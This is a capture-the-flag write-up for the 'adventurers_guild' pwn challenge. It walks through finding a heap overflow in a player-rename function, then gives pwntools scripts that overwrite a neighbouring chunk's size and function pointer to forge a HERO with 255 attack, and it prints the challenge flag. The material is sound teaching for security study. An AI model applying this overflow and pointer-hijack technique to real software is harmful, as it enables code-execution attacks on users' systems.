# Adventurer Guild

---

> Description: Shortly after you and Jaga arrived new world, it became evident that the fastest way to build rapport with the natives would be to help them out by taking up some quests posted at the town's Adventurer's Guild. To take up quests, your party must first be registered with the guild, and quest requirements must be met.
>
> Difficulty: Easy
>
> Files: [adventurers_guild](./adventurers_guild)

---

## Playing Around

The initial approach to any pwn challenge is to play around till you break something :D

Running the program, we can see that we are introduced with a menu

```
╭━━━━┳╮╱╱╱╱╱╭━━━╮╱╭╮╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╭╮╱╱╭╮
┃╭╮╭╮┃┃╱╱╱╱╱┃╭━╮┃╱┃┃╱╱╱╱╱╱╱╭╯╰╮╱╱╱╱╱╱╱╱╱╭╮╱╱╱┃╭━╮┃╱╱╱┃┃╱╱┃┃
╰╯┃┃╰┫╰━┳━━╮┃┃╱┃┣━╯┣╮╭┳━━┳━╋╮╭╋╮╭┳━┳━━┳━┫┣━━╮┃┃╱╰╋╮╭┳┫┃╭━╯┃
╱╱┃┃╱┃╭╮┃┃━┫┃╰━╯┃╭╮┃╰╯┃┃━┫╭╮┫┃┃┃┃┃╭┫┃━┫╭┻┫━━┫┃┃╭━┫┃┃┣┫┃┃╭╮┃
╱╱┃┃╱┃┃┃┃┃━┫┃╭━╮┃╰╯┣╮╭┫┃━┫┃┃┃╰┫╰╯┃┃┃┃━┫┃╱┣━━┃┃╰┻━┃╰╯┃┃╰┫╰╯┃
╱╱╰╯╱╰╯╰┻━━╯╰╯╱╰┻━━╯╰╯╰━━┻╯╰┻━┻━━┻╯╰━━┻╯╱╰━━╯╰━━━┻━━┻┻━┻━━╯

╔═ MAIN MENU ════════════════════════════════════════════╗
║  1. Register new player (max. 3)                       ║
║  2. Edit player information                            ║
║  3. Check quest board                                  ║
║  4. Exit                                               ║
╚════════════════════════════════════════════════════════╝

 Choice =>

```

If we check the quest board, we can see the requirements to obtain a flag.

```
╔══ GUILD QUEST BOARD ═══════════════════════════════════╗
║  ┌──────────────────────────────────────────────────┐  ║
║  │  ●           URGENT HELP REQUIRED!            ●  │  ║
║  │                                                  │  ║
║  │  Requirements:                                   │  ║
║  │  - At least one Hero in party                    │  ║
║  │  - Hero must have at least 255 attack            │  ║
║  │                                                  │  ║
║  │  A giant frog recently appeared in our village   │  ║
║  │  and kidnapped our chief. We're aware of the     │  ║
║  │  location of it's hideout but it's simply too    │  ║
║  │  powerful for us to defeat. Please send help!    │  ║
║  │  We are desperate and will pay upfront.          │  ║
║  │                                                  │  ║
║  │  Reward:                                         │  ║
║  │  - Flag                                          │  ║
║  │                                                  │  ║
║  │  ●                                            ●  │  ║
║  └──────────────────────────────────────────────────┘  ║
╚════════════════════════════════════════════════════════╝

   [ YOUR PARTY DOES NOT MEET THE QUEST REQUIREMENTS! ]

              [ Press ENTER to continue ]

```

Let's try to register a new player and poke around for buffer overflows.

If we register a player with a long name,

```
╔════════════════════════════════════════════════════════╗
║                  PLAYER REGISTRATION                   ║
╚════════════════════════════════════════════════════════╝
 Name => AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

we simply get a player with a shorter name.

```
╭━━━━┳╮╱╱╱╱╱╭━━━╮╱╭╮╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╭╮╱╱╭╮
┃╭╮╭╮┃┃╱╱╱╱╱┃╭━╮┃╱┃┃╱╱╱╱╱╱╱╭╯╰╮╱╱╱╱╱╱╱╱╱╭╮╱╱╱┃╭━╮┃╱╱╱┃┃╱╱┃┃
╰╯┃┃╰┫╰━┳━━╮┃┃╱┃┣━╯┣╮╭┳━━┳━╋╮╭╋╮╭┳━┳━━┳━┫┣━━╮┃┃╱╰╋╮╭┳┫┃╭━╯┃
╱╱┃┃╱┃╭╮┃┃━┫┃╰━╯┃╭╮┃╰╯┃┃━┫╭╮┫┃┃┃┃┃╭┫┃━┫╭┻┫━━┫┃┃╭━┫┃┃┣┫┃┃╭╮┃
╱╱┃┃╱┃┃┃┃┃━┫┃╭━╮┃╰╯┣╮╭┫┃━┫┃┃┃╰┫╰╯┃┃┃┃━┫┃╱┣━━┃┃╰┻━┃╰╯┃┃╰┫╰╯┃
╱╱╰╯╱╰╯╰┻━━╯╰╯╱╰┻━━╯╰╯╰━━┻╯╰┻━┻━━┻╯╰━━┻╯╱╰━━╯╰━━━┻━━┻┻━┻━━╯

                     [ CURRENT PARTY ]
╭────────────────────────────────────────────────────────╮
  NAME: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  JOB : WARRIOR ⚔️
  ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
  HP  : 12
  ATK : 24
  ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
  STR : 23
  DEX : 13
  INT : 1
╰────────────────────────────────────────────────────────╯

╔═ MAIN MENU ════════════════════════════════════════════╗
║  1. Register new player (max. 3)                       ║
║  2. Edit player information                            ║
║  3. Check quest board                                  ║
║  4. Exit                                               ║
╚════════════════════════════════════════════════════════╝

 Choice =>

```

If we edit the information of our player and give it a long name,

```
╔════════════════════════════════════════════════════════╗
║  Which party member would you like to rename?          ║
╚════════════════════════════════════════════════════════╝
   1. AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

 Choice => 1
 Name => AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

we simply get a player with a longer name.

```
╭━━━━┳╮╱╱╱╱╱╭━━━╮╱╭╮╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╭╮╱╱╭╮
┃╭╮╭╮┃┃╱╱╱╱╱┃╭━╮┃╱┃┃╱╱╱╱╱╱╱╭╯╰╮╱╱╱╱╱╱╱╱╱╭╮╱╱╱┃╭━╮┃╱╱╱┃┃╱╱┃┃
╰╯┃┃╰┫╰━┳━━╮┃┃╱┃┣━╯┣╮╭┳━━┳━╋╮╭╋╮╭┳━┳━━┳━┫┣━━╮┃┃╱╰╋╮╭┳┫┃╭━╯┃
╱╱┃┃╱┃╭╮┃┃━┫┃╰━╯┃╭╮┃╰╯┃┃━┫╭╮┫┃┃┃┃┃╭┫┃━┫╭┻┫━━┫┃┃╭━┫┃┃┣┫┃┃╭╮┃
╱╱┃┃╱┃┃┃┃┃━┫┃╭━╮┃╰╯┣╮╭┫┃━┫┃┃┃╰┫╰╯┃┃┃┃━┫┃╱┣━━┃┃╰┻━┃╰╯┃┃╰┫╰╯┃
╱╱╰╯╱╰╯╰┻━━╯╰╯╱╰┻━━╯╰╯╰━━┻╯╰┻━┻━━┻╯╰━━┻╯╱╰━━╯╰━━━┻━━┻┻━┻━━╯

                     [ CURRENT PARTY ]
╭────────────────────────────────────────────────────────╮
  NAME: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  JOB : WARRIOR ⚔️
  ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
  HP  : 71
  ATK : 128
  ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
  STR : 65
  DEX : 65
  INT : 65
╰────────────────────────────────────────────────────────╯

╔═ MAIN MENU ════════════════════════════════════════════╗
║  1. Register new player (max. 3)                       ║
║  2. Edit player information                            ║
║  3. Check quest board                                  ║
║  4. Exit                                               ║
╚════════════════════════════════════════════════════════╝

 Choice =>


```

At this point, it should be evident that although keying in the name when registering truncates our name length, keying in the name when we edit player information doesnt seem to have a limit on a buffer size. Perhaps we can do some sort of overflow?

Let's poke at it one last time.

```
╔════════════════════════════════════════════════════════╗
║                  PLAYER REGISTRATION                   ║
╚════════════════════════════════════════════════════════╝
 Name => BYE
malloc(): corrupted top size
Aborted (core dumped)
```

It seems that we managed to crash the program.


## Dynamic Analysis

We can open the binary in GDB and replicate the crash. Upon crashing, we can analyze the state of the heap

```
* truncated *
0x000000000041d6c0    0x0000000000000000    ........   Chunk[4], Flag=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
0x000000000041d6c8    0x0000000000000061    .......a
0x000000000041d6d0    0x0000000000407d70    .....@}p    [ ←  endbr64 ] (in adventurers_guild)
0x000000000041d6d8    0x4141414141414141    AAAAAAAA
0x000000000041d6e0    0x4141414141414141    AAAAAAAA
0x000000000041d6e8    0x4141414141414141    AAAAAAAA
0x000000000041d6f0    0x4141414141414141    AAAAAAAA
0x000000000041d6f8    0x4141414141414141    AAAAAAAA
0x000000000041d700    0x4141414141414141    AAAAAAAA
0x000000000041d708    0x4141414141414141    AAAAAAAA
0x000000000041d710    0x4141414141414141    AAAAAAAA
0x000000000041d718    0x4141414141414141    AAAAAAAA
0x000000000041d720    0x4141414141414141    ← Top Chunk
0x000000000041d728    0x4141414141414141    ← Top Chunk Size
```

It is evident that our input has overflowed into the top chunk. This means that we have a heap overflow.

However, we will keep in mind that our objective is still to create a HERO character with 255 attack. 

## Static Analysis

```c
__int64 __fastcall allocate_memory_for_player(__int64 a1)
{
  __int64 v1; // rbx

  v1 = operator new(0x50uLL);
  sub_4030E6(v1, a1);
  return v1;
}

unsigned __int64 create_player()
{
  __int64 v0; // rax
  int i; // [rsp+Ch] [rbp-44h]
  char v3[40]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v4; // [rsp+38h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  if ( sub_403E1E() )
  {
    sub_40387B();
  }
  else
  {
    sub_4036A9();
    std::operator<<<std::char_traits<char>>(&std::cout, &unk_404D68);
    std::operator<<<std::char_traits<char>>(&std::cout, " Name => ");
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v3);
    std::operator>><char>(&std::cin, v3);
    for ( i = 0; i <= 2; ++i )
    {
      if ( !players[i] )
      {
        v0 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(v3);
        players[i] = allocate_memory_for_player(v0);
        break;
      }
    }
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v3);
  }
  return __readfsqword(0x28u) ^ v4;
}
```

If we look at the code above, we can see that it creates a user, allocates some memory for it and saves it in a list called `players`.

```c
unsigned __int64 sub_403BC7()
{
  __int64 v1; // rax
  __int64 v2; // rbx
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rdi
  int i; // [rsp+Ch] [rbp-224h]
  char v8[520]; // [rsp+10h] [rbp-220h] BYREF
  unsigned __int64 v9; // [rsp+218h] [rbp-18h]

  v9 = __readfsqword(0x28u);
  sub_4036A9();
  sub_403BA9();
  for ( i = 0; i <= 2 && players[i]; ++i )
  {
    if ( (**players[i])(qword_40AAB0[i]) == 5 && (*(*qword_40AAB0[i] + 8LL))(qword_40AAB0[i]) == 0xFF ) // <-- CHECK IS HERE
    {
      std::ostream::operator<<(&std::cout, &std::endl<char,std::char_traits<char>>);
      v1 = std::operator<<<std::char_traits<char>>(&std::cout, "   [ YOUR PARTY ACCEPTED THE QUEST ]");
      std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
      std::ifstream::basic_ifstream(v8, "/home/adventurers_guild/flag.txt", 8LL);
      v2 = std::operator<<<std::char_traits<char>>(&std::cout, "  Flag: ");
      v3 = std::ifstream::rdbuf(v8);
      v4 = std::ostream::operator<<(v2, v3);
      std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
      std::ifstream::close(v8);
      sub_4036C7();
      exit(0);
    }
  }
  std::ostream::operator<<(&std::cout, &std::endl<char,std::char_traits<char>>);
  v5 = std::operator<<<std::char_traits<char>>(&std::cout, "   [ YOUR PARTY DOES NOT MEET THE QUEST REQUIREMENTS! ]");
  std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  sub_4036C7();
  return __readfsqword(0x28u) ^ v9;
}
```

If we look at the **Check Quest Board** function in IDA, we can identify the line that checks if we have a **HERO** with 255 attack.

It calls a function pointed to by the pointer in the memory allocated for the player.

## Back to GDB

If we look at the heap in GDB after creating a player, we can identify the heap chunk that belongs to the player.

```c
0x000000000041d6c0    0x0000000000000000    ........   Chunk[4], Flag=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
0x000000000041d6c8    0x0000000000000061    .......a                                            // <-- Chunk Size
0x000000000041d6d0    0x0000000000407d70    .....@}p    [ ←  endbr64 ] (in adventurers_guild)   // <-- Function Pointer
0x000000000041d6d8    0x0031524559414c50    .1REYALP                                            // <-- Player Name
0x000000000041d6e0    0x0000000000000000    ........
        ↓        [...]        ↓
0x000000000041d718    0x00000014160a010a    ........
```
If we look at the function pointed to by the pointer,

```
gef➤  x/gx 0x0000000000407d70
0x407d70:       0x00000000004033ee
gef➤  x/20i 0x00000000004033ee
   0x4033ee:    endbr64
   0x4033f2:    push   rbp
   0x4033f3:    mov    rbp,rsp
   0x4033f6:    mov    QWORD PTR [rbp-0x8],rdi
   0x4033fa:    mov    rax,QWORD PTR [rbp-0x8]
   0x4033fe:    movzx  edx,BYTE PTR [rax+0x4b]
   0x403402:    mov    rax,QWORD PTR [rbp-0x8]
   0x403406:    movzx  eax,BYTE PTR [rax+0x4c]
   0x40340a:    cmp    dl,al
   0x40340c:    jb     0x403429
   0x40340e:    mov    rax,QWORD PTR [rbp-0x8]
   0x403412:    movzx  edx,BYTE PTR [rax+0x4b]
   0x403416:    mov    rax,QWORD PTR [rbp-0x8]
   0x40341a:    movzx  eax,BYTE PTR [rax+0x4a]
   0x40341e:    cmp    dl,al
   0x403420:    jb     0x403429
   0x403422:    mov    eax,0x2
   0x403427:    jmp    0x40345d
   0x403429:    mov    rax,QWORD PTR [rbp-0x8]
   0x40342d:    movzx  edx,BYTE PTR [rax+0x4c]

```

we can find that it points to `0x4033ee`, which is the following function:

```c
__int64 __fastcall sub_4033EE(_BYTE *a1)
{
  if ( a1[75] >= a1[76] && a1[75] >= a1[74] )
    return 2LL;
  if ( a1[76] < a1[75] || a1[76] < a1[74] )
    return 3LL;
  return 4LL;
}
```

As you can see, this program is a scam. The function will never return a value of **5**.

However, thankfully for us, we can overflow and overwrite this function pointer.

```
┌─────────────────┐
│                 │
│                 │  │
│   Player 1      │  │
│   Heap          │  │
│                 │  │
│                 │  │   Player 1
├─────────────────┤  │   overflow into
│                 │  │   Player 2 :D
│                 │  │
│   Player 2      │  │
│   Heap          │  ▼
│                 │
│                 │
└─────────────────┘
```

However, we would need to find an address that contains a pointer to a function that returns 5.

If we look around the address that points to the function pointer in GDB,

```
gef➤  x/10gx 0x0000000000407d70
0x407d70:       0x00000000004033ee      0x0000000000403162
0x407d80:       0x000000000040327a      0x0000000000000000
0x407d90:       0x0000000000407dd8      0x0000000000403696
0x407da0:       0x0000000000403536      0x00000000004035bc
0x407db0:       0x00007ffff7e27fa0      0x00000000004042a8
```

We find even more function pointers. Specifically, the function at to `0x403696` pointed to by `0x407d98` does nothing but return 5.

```c
__int64 sub_403696()
{
  return 5LL;
}
```

which is exactly what we wanted.

Let's try to make the exploit work.

## Exploit

```python
from pwn import *

CPROMPT = b"Choice => "
NPROMPT = b"Name => "
POINTER = p64(0x407d98)

p = process("./adventurers_guild")

p.sendlineafter(CPROMPT, b"1")
p.sendlineafter(NPROMPT, b"a")

p.sendlineafter(CPROMPT, b"1")
p.sendlineafter(NPROMPT, b"b")

payload = b"A"*72
payload += p64(0)
payload += p64(0x61) # the heap is fragile, remember to write back the size of the chunk when overflowing
payload += POINTER # overflow function pointer
payload += b"A"*72
#payload += p64(0x00000000004036a2)

p.sendlineafter(CPROMPT, b"2")
p.sendlineafter(CPROMPT, b"1")
p.sendlineafter(NPROMPT, payload)


p.interactive()

```

Upon running this, we have a HERO with ATK of 68.

```
╭━━━━┳╮╱╱╱╱╱╭━━━╮╱╭╮╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╭╮╱╱╭╮
┃╭╮╭╮┃┃╱╱╱╱╱┃╭━╮┃╱┃┃╱╱╱╱╱╱╱╭╯╰╮╱╱╱╱╱╱╱╱╱╭╮╱╱╱┃╭━╮┃╱╱╱┃┃╱╱┃┃
╰╯┃┃╰┫╰━┳━━╮┃┃╱┃┣━╯┣╮╭┳━━┳━╋╮╭╋╮╭┳━┳━━┳━┫┣━━╮┃┃╱╰╋╮╭┳┫┃╭━╯┃
╱╱┃┃╱┃╭╮┃┃━┫┃╰━╯┃╭╮┃╰╯┃┃━┫╭╮┫┃┃┃┃┃╭┫┃━┫╭┻┫━━┫┃┃╭━┫┃┃┣┫┃┃╭╮┃
╱╱┃┃╱┃┃┃┃┃━┫┃╭━╮┃╰╯┣╮╭┫┃━┫┃┃┃╰┫╰╯┃┃┃┃━┫┃╱┣━━┃┃╰┻━┃╰╯┃┃╰┫╰╯┃
╱╱╰╯╱╰╯╰┻━━╯╰╯╱╰┻━━╯╰╯╰━━┻╯╰┻━┻━━┻╯╰━━┻╯╱╰━━╯╰━━━┻━━┻┻━┻━━╯

                     [ CURRENT PARTY ]
╭────────────────────────────────────────────────────────╮
  NAME: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  JOB : WARRIOR ⚔️
  ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
  HP  : 71
  ATK : 128
  ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
  STR : 65
  DEX : 65
  INT : 65
╰────────────────────────────────────────────────────────╯

╭────────────────────────────────────────────────────────╮
  NAME:
  JOB : HERO ⭐
  ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
  HP  : 14
  ATK : 68
  ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
  STR : 10
  DEX : 32
  INT : 25
╰────────────────────────────────────────────────────────╯

╔═ MAIN MENU ════════════════════════════════════════════╗
║  1. Register new player (max. 3)                       ║
║  2. Edit player information                            ║
║  3. Check quest board                                  ║
║  4. Exit                                               ║
╚════════════════════════════════════════════════════════╝

 Choice => $

```

Now we want to modify the ATK. We will have to go back and look at how the ATK is calculated.

```c
    if ( (**players[i])(qword_40AAB0[i]) == 5 && (*(*qword_40AAB0[i] + 8LL))(qword_40AAB0[i]) == 0xFF ) // <-- CHECK IS HERE
```

The program will take in the next function pointer after `0x403696` which is `0x403536`.

If we look at the decompiled function:

```c
_DWORD *__fastcall sub_40348D(_DWORD *a1, _DWORD *a2)
{
  if ( *a2 >= *a1 )
    return a1;
  else
    return a2;
}

__int64 __fastcall sub_403536(unsigned __int8 *a1)
{
  int v2; // [rsp+10h] [rbp-10h] BYREF
  int v3; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = 255;
  v2 = a1[76] + a1[75] + a1[73] + a1[74];
  return *sub_40348D(&v2, &v3);
}
```

We essentially need to make it such that 

```c
v2 = a1[76] + a1[75] + a1[73] + a1[74];
```

v2 will be more than 255.

We can easily achieve this my increasing our overflow to overwrite `a1[73-76]`.

```python
from pwn import *

CPROMPT = b"Choice => "
NPROMPT = b"Name => "
POINTER = p64(0x407d98)

p = process("./adventurers_guild")

p.sendlineafter(CPROMPT, b"1")
p.sendlineafter(NPROMPT, b"a")

p.sendlineafter(CPROMPT, b"1")
p.sendlineafter(NPROMPT, b"b")

payload = b"A"*72
payload += p64(0)
payload += p64(0x61)
payload += POINTER
payload += b"A"*76

p.sendlineafter(CPROMPT, b"2")
p.sendlineafter(CPROMPT, b"1")
p.sendlineafter(NPROMPT, payload)


p.interactive()

```
which gives us a HERO with 255 attack. We can then retrieve our flag.


```
╔══ GUILD QUEST BOARD ═══════════════════════════════════╗
║  ┌──────────────────────────────────────────────────┐  ║
║  │  ●           URGENT HELP REQUIRED!            ●  │  ║
║  │                                                  │  ║
║  │  Requirements:                                   │  ║
║  │  - At least one Hero in party                    │  ║
║  │  - Hero must have at least 255 attack            │  ║
║  │                                                  │  ║
║  │  A giant frog recently appeared in our village   │  ║
║  │  and kidnapped our chief. We're aware of the     │  ║
║  │  location of it's hideout but it's simply too    │  ║
║  │  powerful for us to defeat. Please send help!    │  ║
║  │  We are desperate and will pay upfront.          │  ║
║  │                                                  │  ║
║  │  Reward:                                         │  ║
║  │  - Flag                                          │  ║
║  │                                                  │  ║
║  │  ●                                            ●  │  ║
║  └──────────────────────────────────────────────────┘  ║
╚════════════════════════════════════════════════════════╝

   [ YOUR PARTY ACCEPTED THE QUEST ]
  Flag: STF22{5UR3_15_T0UGH_B31NG_4N_1S3K41_H3R0_d6fa11ffc2833f2eccd2e914a9a4d912}


              [ Press ENTER to continue ]$

```
